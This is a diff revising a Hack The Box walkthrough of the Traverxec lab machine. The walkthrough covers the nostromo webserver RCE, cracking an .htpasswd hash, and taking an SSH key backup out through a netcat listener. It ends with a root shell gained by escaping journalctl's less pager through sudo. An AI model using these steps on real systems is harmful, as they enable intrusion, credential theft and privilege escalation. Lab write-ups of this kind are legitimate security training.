@@ -1,8 +1,8 @@
 ---
 layout: single
 title: Traverxec - Hack The Box
-excerpt: ""
-date: 2020-04-10
+excerpt: "Traverxec is an easy box that start with a custom vulnerable webserver with an unauthenticated RCE that we exploit to land an initial shell. After pivoting to another user by finding his SSH private key and cracking it, we get root through the less pager invoked by journalctl running as root through sudo."
+date: 2020-04-11
 classes: wide
 header:
   teaser: <img src="/assets/images/traverxec/traverxec-logo.png">
@@ -11,12 +11,16 @@ header:
 categories:
   - hackthebox
 tags:
-  - 
+  - nostromo
+  - journalctl
+  - gtfobins
 ---
 
 
 
 ## Summary
+
+Traverxec is an easy box that start with a custom vulnerable webserver with an unauthenticated RCE that we exploit to land an initial shell. After pivoting to another user by finding his SSH private key and cracking it, we get root through the less pager invoked by journalctl running as root through sudo.
 
 ## Box Details
 
@@ -119,7 +123,7 @@ After checking the system and looking for the user.txt flag, I found a user davi
 
 <img src="/assets/images/traverxec/david-home.png">
 
-For further enumeration, I run LinEnum.sh script with the thorough checks enabled and the most interesting thing that popped out of the logs was a password hash in the .htpasswd file and I used JohnTheRipper to crack the hash.
+For further enumeration, I run `LinEnum.sh` script with the thorough checks enabled and the most interesting thing that popped out of the logs was a password hash in the .htpasswd file and I used JohnTheRipper to crack the hash.
 
 ```
 [-] htpasswd found - could contain passwords:
@@ -192,7 +196,7 @@ homedirs_public        public_www
 www-data@traverxec:/var/nostromo/conf$
 ```
 
-From the webserver [manual](www.nazgul.ch/dev/nostromo_man.htmla)
+More information can be found from the webserver [manual](www.nazgul.ch/dev/nostromo_man.htmla)
 
 ```
 HOMEDIRS
@@ -204,9 +208,9 @@ HOMEDIRS
 
 We can try to check user david's home directory to see if we can list the files: `http://10.10.10.165/~david`
 
-<img src="assets/images/traverxec/david-public.png">
+<img src="/assets/images/traverxec/david-public.png">
 
-Though the link was accessible, we couldn't find anything. Also we can see that access has been restricted to only public_www within the user david's home directory. We are able to list files in the public_www directory and noticed a backup ssh file. We will download that and check for the contents, possible SSH keys which can enable us to login to the SSH service.
+Though the link was accessible, we couldn't find anything. Also we can see that access has been restricted to only `public_www` within the user david's home directory. We are able to list files in the `public_www` directory and noticed a backup ssh file. We will download that and check for the contents, possible SSH keys which can enable us to login to the SSH service.
 
 ```
 www-data@traverxec:/usr/bin$ ls -larth /home/david/public_www/protected-file-area
@@ -218,9 +222,8 @@ drwxr-xr-x 2 david david 4.0K Oct 25 17:02 .
 -rw-r--r-- 1 david david 1.9K Oct 25 17:02 backup-ssh-identity-files.tgz
 www-data@traverxec:/usr/bin$
 ```
-We can use netcat to transfer the file from the server to our local machine
 
-On kali machine:
+We can use netcat to transfer the file from the server to our local machine. On attacker machine:
 
 ```
 # nc -lvp 9001 > backup-ssh-identity-files.tgz
@@ -287,17 +290,9 @@ david@traverxec:~$
 
 ## Privilege Escalation
 
-After further enumeration with LinEnum.sh and linux-smart-enumeration, nothing really jumped out of the logs. However user david has a `bin` directory in the `/home` which had the following scripts:
+After further enumeration with `LinEnum.sh` and `linux-smart-enumeration`, nothing really jumped out of the logs. However user david has a `bin` directory in the `/home` directory which had the following scripts:
 
-```
-avid@traverxec:~/bin$ ls -larth
-total 16K
--rwx------ 1 david david  363 Oct 25 16:26 server-stats.sh
--r-------- 1 david david  802 Oct 25 16:26 server-stats.head
-drwx------ 2 david david 4.0K Dec  2 10:58 .
-drwx--x--x 7 david david 4.0K Dec  2 11:06 ..
-
-
+```bash
 david@traverxec:~/bin$ cat server-stats.sh
 #!/bin/bash
 
@@ -309,16 +304,16 @@ echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -
 echo " "
 echo "Last 5 journal log lines:"
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-david@traverxec:~/bin$
+
 ```
 
-This script prints the last 5 log entries using the command journalctl when executed.
+This script prints the last 5 log entries using the command `journalctl` when executed.
 
 <img src="/assets/images/traverxec/journalctl.png">
 
-Further research for any privilege escalation from [GTFOBINS](https://gtfobins.github.io/gtfobins/journalctl/) since the scritp is using the `sudo` command, I found the following: 
+Further research for any privilege escalation from [GTFOBINS](https://gtfobins.github.io/gtfobins/journalctl/) since the script is using the `sudo` command, I found the following:
 
-"The journalctl command invokes the less command by default"
+"The `journalctl` command invokes the `less` command by default"
 
 In order to exploit the less and journalctl command, we must force the log entries to be printed say one or two lines at a time so we can drop into less and then escape it using `!/bin/sh`. To do that we will resize the terminal window size and issue `!/bin/sh`in the resized window to gain our root shell:
 
